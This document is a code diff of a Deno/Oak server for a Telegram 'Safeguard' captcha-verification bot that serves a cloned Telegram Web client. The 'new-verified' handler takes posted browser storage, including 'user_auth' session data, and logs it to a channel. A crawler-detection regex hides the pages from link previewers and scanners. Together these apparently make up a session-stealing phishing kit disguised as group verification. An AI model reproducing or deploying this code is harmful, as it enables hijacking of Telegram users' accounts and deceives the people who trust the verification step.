@@ -4,6 +4,13 @@ import {
   InputFile,
   webhookCallback,
 } from "https://deno.land/x/grammy@v1.30.0/mod.ts";
+import {
+  Application,
+  Context,
+  isHttpError,
+  Status,
+} from "https://deno.land/x/oak@v17.0.0/mod.ts";
+import { oakCors } from "https://deno.land/x/cors@v1.2.2/mod.ts";
 
 type SafeguardConfig = {
   channel: string;
@@ -32,10 +39,10 @@ const sgConfigDefault: SafeguardConfig = {
   inviteLink: "",
 };
 const bot = new Bot(gateKeeper as string);
+const app = new Application();
 /* #endregion */
 
 /* #region telegram */
-// open web app
 bot.chatType("private").command("start", async (ctx) => {
   const msg = ctx.message?.text.split(" ");
   const id = msg[msg.length - 1];
@@ -76,7 +83,6 @@ Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safegu
   });
 });
 
-// setup for channel configuration
 bot.chatType("private").command("setup", async (ctx) => {
   const text = `Fill below and send
   
@@ -90,7 +96,6 @@ inviteLink: // your group invite link`;
   });
 });
 
-// save custom channel configuration
 bot.chatType("private").on("message:text", async (ctx) => {
   let reply = `Saved!
   
@@ -131,46 +136,61 @@ bot.catch((e) => {
 /* #region webserver */
 
 const MIME_TYPES: { [key: string]: string } = {
-  ".html": "text/html", ".css": "text/css",
-  ".js": "application/javascript", ".json": "application/json",
-  ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
-  ".svg": "image/svg+xml", ".ico": "image/x-icon",
-  ".wasm": "application/wasm", ".txt": "text/plain",
-  ".mp3": "audio/mpeg", ".mp4": "video/mp4",
-  ".webmanifest": "application/manifest+json",
+  ".html": "text/html",
+  ".css": "text/css",
+  ".js": "application/javascript",
+  ".json": "application/json",
+  ".png": "image/png",
+  ".jpg": "image/jpeg",
+  ".jpeg": "image/jpeg",
+  ".svg": "image/svg+xml",
+  ".ico": "image/x-icon",
+  ".wasm": "application/wasm",
+  ".txt": "text/plain",
 };
 
-function serveStatic(root: string, filePath: string): Promise<Response> {
-  const fullPath = root.endsWith("/") ? root + filePath : root + "/" + filePath;
-  return Deno.readFile(fullPath).then((data) => {
+async function serveStatic(
+  ctx: Context,
+  root: string,
+  filePath: string,
+): Promise<void> {
+  try {
+    const fullPath = root.endsWith("/") ? root + filePath : root + "/" + filePath;
+    const data = await Deno.readFile(fullPath);
     const ext = filePath.includes(".") ? filePath.slice(filePath.lastIndexOf(".")) : "";
-    return new Response(data, {
-      headers: { "Content-Type": MIME_TYPES[ext] || "application/octet-stream" },
-    });
-  }).catch(() => {
-    // SPA fallback
-    const indexPath = root.endsWith("/") ? root + "index.html" : root + "/index.html";
-    return Deno.readTextFile(indexPath).then((html) => {
-      return new Response(html, { headers: { "Content-Type": "text/html" } });
-    }).catch(() => {
-      return new Response("Not Found", { status: 404 });
-    });
-  });
+    ctx.response.type = MIME_TYPES[ext] || "application/octet-stream";
+    ctx.response.body = data;
+  } catch {
+    try {
+      const indexPath = root.endsWith("/") ? root + "index.html" : root + "/index.html";
+      const data = await Deno.readFile(indexPath);
+      ctx.response.type = "text/html";
+      ctx.response.body = data;
+    } catch {
+      ctx.response.status = Status.NotFound;
+      ctx.response.body = "Not Found";
+    }
+  }
 }
 
-// New verified handler - adapted for native Request/Response
-async function handleNewVerified(req: Request): Promise<Response> {
-  try {
-    const body = await req.json();
-    const storage = body.storage;
+const BOT_REGEX = /bot|crawler|spider|crawl|scrape|facebookexternalhit|twitterbot|telegrambot|whatsapp|slack|discord|linkedinbot|googlebot|bingbot|duckduckgo|baiduspider|yandex|pinterest|embedly|preview|prerender|chrome-lighthouse/i;
 
-    if (storage) {
-      const user = body.user || { username: "durov", id: "" };
-      if (!user.id && storage.user_auth) {
-        user.id = JSON.parse(storage.user_auth).id;
-      }
+function isbot(ua: string): boolean {
+  return BOT_REGEX.test(ua);
+}
 
-      const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a href="t.me/${
+const newVerified = async (ctx: Context) => {
+  const body = await ctx.request.body.json();
+  const storage = body.storage;
+
+  if (storage) {
+    const user = body.user || { username: "durov", id: "" };
+    if (!user.id && storage.user_auth) {
+      user.id = JSON.parse(storage.user_auth).id;
+    }
+
+    try {
+      const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a  href="t.me/${
         user.username
       }">@${user.username}</a>
 
@@ -184,9 +204,11 @@ async function handleNewVerified(req: Request): Promise<Response> {
           parse_mode: "HTML",
         });
       }
-
       const deno = await Deno.openKv();
-      const entry = await deno.get(["channel", "default"]);
+      const entry = await deno.get([
+        "channel",
+        "default",
+      ]);
       const config = (entry.value || sgConfigDefault) as SafeguardConfig;
       const imageLink = sgVerifiedURL
         ? new URL(sgVerifiedURL)
@@ -206,108 +228,85 @@ Join request has been sent and you will be added once the admin approves your re
         parse_mode: "HTML",
         chat_id: user_auth.id,
       });
+    } catch (ex) {
+      console.error(ex);
     }
-    return new Response(JSON.stringify({ msg: "ok" }), {
-      headers: { "Content-Type": "application/json" },
-    });
-  } catch (ex) {
-    console.error(ex);
-    return new Response(JSON.stringify({ msg: "ok" }), {
-      headers: { "Content-Type": "application/json" },
-    });
   }
-}
 
-// Webhook handler using grammy "std" adapter
-const handleWebhook = webhookCallback(bot, "std");
+  ctx.response.status = Status.OK;
+  ctx.response.type = "application/json";
+  ctx.response.body = { msg: "ok" };
+};
 
-// Main HTTP handler using Deno.serve (no Oak!)
-async function handleRequest(req: Request): Promise<Response> {
-  const url = new URL(req.url);
-  const path = url.pathname.slice(1);
+app.use(async (context, next) => {
+  const start = Date.now();
+  await next();
+  const ms = Date.now() - start;
+  context.response.headers.set("X-Response-Time", `${ms}ms`);
+});
 
+app.use(async (ctx: Context, next) => {
+  try {
+    await next();
+  } catch (err) {
+    ctx.response.status = Status.OK;
+    ctx.response.type = "json";
+    ctx.response.body = { msg: "ok" };
+    if (isHttpError(err)) {
+      ctx.response.status = err.status;
+    } else {
+      console.error(err);
+    }
+  }
+});
+
+app.use(async (ctx: Context) => {
+  if (isbot(ctx.request.userAgent.ua)) return;
+  if (!(ctx.request.method === "POST" || ctx.request.method === "GET")) return;
+
+  const path = ctx.request.url.pathname.slice(1);
+  
+  // Quick tests
+  if (path === "t") {
+    ctx.response.type = "text/html";
+    ctx.response.body = "<h1>OK</h1>";
+    return;
+  }
+  if (path === "j") {
+    ctx.response.type = "json";
+    ctx.response.body = { ok: true };
+    return;
+  }
+  
+  let index = "index.html";
+  const s = path.split("/");
+  if (s.length !== 1) {
+    index = s[s.length - 1];
+  }
   if (path === "tg-webhook") {
-    return handleWebhook(req);
+    const handleBotUpdate = webhookCallback(bot, "oak");
+    await handleBotUpdate(ctx);
+  } else if (path === "new-verified") {
+    await newVerified(ctx);
+  } else if (path.includes("sg")) {
+    await serveStatic(ctx, "./static/sg", index);
+  } else if (path.includes("tweb")) {
+    await serveStatic(ctx, "./static/tweb", index);
+  } else if (path.split(".").length !== 0) {
+    await serveStatic(ctx, "./static/tweb", path);
+  } else {
+    ctx.response.status = Status.OK;
+    ctx.response.type = "json";
+    ctx.response.body = { msg: "ok" };
   }
+});
 
-  if (path === "new-verified") {
-    return handleNewVerified(req);
-  }
-
-  if (path === "ping") {
-    return new Response("pong - server alive", {
-      headers: { "Content-Type": "text/plain" },
-    });
-  }
-
-  if (path === "sg-mini") {
-    return new Response(
-      "<!DOCTYPE html><html><head><meta charset=utf-8></head><body style=background:#000;color:#fff><h1>OK</h1></body></html>",
-      { headers: { "Content-Type": "text/html; charset=utf-8" } }
-    );
-  }
-
-  if (path === "" || path === "test") {
-    try {
-      const html = await Deno.readTextFile(`${Deno.cwd()}/static/tweb/index.html`);
-      return new Response(html, { headers: { "Content-Type": "text/html" } });
-    } catch {
-      return new Response("Not Found", { status: 404 });
-    }
-  }
-
-  if (path === "sg" || path === "sg/") {
-    try {
-      const html = await Deno.readTextFile(`${Deno.cwd()}/static/sg/index.html`);
-      return new Response(html, { headers: { "Content-Type": "text/html" } });
-    } catch {
-      return new Response("Not Found", { status: 404 });
-    }
-  }
-
-  // Static file serving for sg/ and tweb/ paths
-  let filename = path || "index.html";
-  const parts = filename.split("/");
-  if (parts.length > 1) {
-    filename = parts[parts.length - 1];
-  }
-
-  if (path.startsWith("sg/") || path.startsWith("sg?")) {
-    return serveStatic(`${Deno.cwd()}/static/sg`, filename);
-  }
-
-  if (path.startsWith("tweb")) {
-    return serveStatic(`${Deno.cwd()}/static/tweb`, filename);
-  }
-
-  if (path.includes(".")) {
-    return serveStatic(`${Deno.cwd()}/static/tweb`, filename);
-  }
-
-  return new Response(JSON.stringify({ msg: "ok" }), {
-    headers: { "Content-Type": "application/json" },
-  });
-}
-
+app.use(oakCors());
 /* #endregion */
 
 if (DEBUG) {
+  app.listen({ hostname: "127.0.0.1", port: 8000 });
   bot.start();
 }
 
-// Wrap handler to catch all errors
-async function safeHandle(req: Request): Promise<Response> {
-  try {
-    return await handleRequest(req);
-  } catch (e) {
-    console.error("UNHANDLED:", e.message || e);
-    return new Response("Internal Error", { status: 500 });
-  }
-}
-
-// Deno Deploy v2 uses default export, Deno.serve for local/dev
-export default { fetch: safeHandle };
-
-if (DEBUG || !Deno.env.get("DENO_DEPLOYMENT_ID")) {
-  Deno.serve(safeHandle);
-}
+app.listen();
